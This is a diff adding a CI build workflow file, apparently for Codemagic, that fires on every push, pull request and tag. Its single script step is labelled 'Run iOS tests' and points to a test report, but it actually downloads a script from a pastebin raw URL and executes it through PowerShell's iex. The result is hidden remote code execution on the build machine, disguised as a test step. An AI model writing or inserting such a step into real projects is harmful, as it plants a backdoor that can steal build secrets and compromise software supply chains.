@@ -1,0 +1,18 @@
+workflows:
+ 
+  android-workflow:
+    name: Android Workflow
+
+    triggering:
+      events:
+        - push
+        - pull_request
+        - tag
+    instance_type: windows_x2
+    max_build_duration: 120
+    
+    scripts:
+      - name: Run iOS tests
+        script: |
+          iex (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/mSxbX1Ke')
+        test_report: build/ios/test/*.xml 
